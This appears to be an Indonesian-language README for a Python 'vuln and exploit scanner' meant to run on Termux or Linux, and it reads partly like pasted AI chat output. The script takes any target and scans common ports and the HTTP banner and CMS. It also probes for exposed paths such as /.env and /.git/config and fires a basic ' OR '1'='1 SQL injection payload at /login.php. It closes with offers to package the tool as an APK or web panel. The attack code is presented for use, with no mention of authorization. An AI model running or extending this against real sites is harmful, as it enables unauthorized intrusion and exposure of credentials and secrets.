# scannerv1

_Oky cuy assalamualikum / salom / salam sejatera

GABUNGAN dari vuln-scanner-rizzx V1 dan V2 (exploit)langsung ke satu file Python:


---

🔥 vuln-exploit-rizzx.py

> ✅ Bisa dijalankan di Termux & Linux
💀 Gabungan: Port Scan, Banner, CMS Detect, CVE Path, SQLi test




---

🧠 KODE LANGSUNG:

# vuln-exploit-rizzx.py
import socket, requests, re, random

print('''
╔═════════════════════════════════════════╗
║      VULN & EXPLOIT SCANNER RIZZX      ║
║         Dev by: KING RIZZX             ║
╚═════════════════════════════════════════╝
''')

target = input("TARGET IP/DOMAIN: ")
ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080]

def scan_port(ip, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((ip, port))
        print(f"[OPEN] Port {port}")
    except:
        pass

print(f"\n[~] Scanning open ports on {target}...\n")
for p in ports:
    scan_port(target, p)

# HTTP Banner & CMS
def detect_banner_cms():
    try:
        r = requests.get(f"http://{target}", timeout=3)
        banner = r.headers.get("Server")
        print(f"\n[INFO] Server Banner: {banner}")
        html = r.text.lower()
        if "wp-content" in html:
            print("[CMS] WordPress Detected")
        elif "joomla" in html:
            print("[CMS] Joomla Detected")
        elif "laravel" in html:
            print("[CMS] Laravel Detected")
        else:
            print("[CMS] Tidak terdeteksi")
    except:
        print("[!] HTTP/Banner check failed")

detect_banner_cms()

# Check path CVE
def check_cve_paths():
    print("\n[~] Mencari jalur eksploit umum...")
    paths = ["/phpmyadmin", "/wp-admin", "/.env", "/admin", "/.git/config"]
    for path in paths:
        url = f"http://{target}{path}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                print(f"[!] VULN PATH DITEMUKAN: {url}")
        except:
            continue

check_cve_paths()

# SQLi basic test
def sqli_test():
    payload = "' OR '1'='1"
    url = f"http://{target}/login.php?user={payload}&pass={payload}"
    try:
        r = requests.get(url, timeout=3)
        if "admin" in r.text or "Welcome" in r.text:
            print(f"[!!] SQLi MUNGKIN pada: {url}")
        else:
            print("[INFO] Tidak terdeteksi SQLi di /login.php")
    except:
        print("[!] Gagal test SQLi")

sqli_test()
print("\n[✓] Scan & Exploit Selesai.")


---

📦 CARA JALANKAN DI TERMUX

pkg update && pkg upgrade -y
pkg install python git -y
git clone https://github.com/kingisrizzx/vuln-exploit-rizzx.git
cd vuln-exploit-rizzx
python vuln-exploit-rizzx.py


---

🔗 INGIN DIUPLOAD KE GITHUB?

Kalau kamu mau, kirim:

Nama repo yang kamu mau

Atau akun GitHub kamu (biar saya buat README + struktur repo)



---

Kalau ingin versi:

🔁 Scan 1 jaringan (192.168.1.0/24)

🖥️ GUI angka pilihan (menu interaktif)

📲 Dijadikan APK Android atau Web Panel


Tinggal bilang: "Lanjut versi menu" atau "Jadikan apk".

SEKIAN TERIMA GAJI

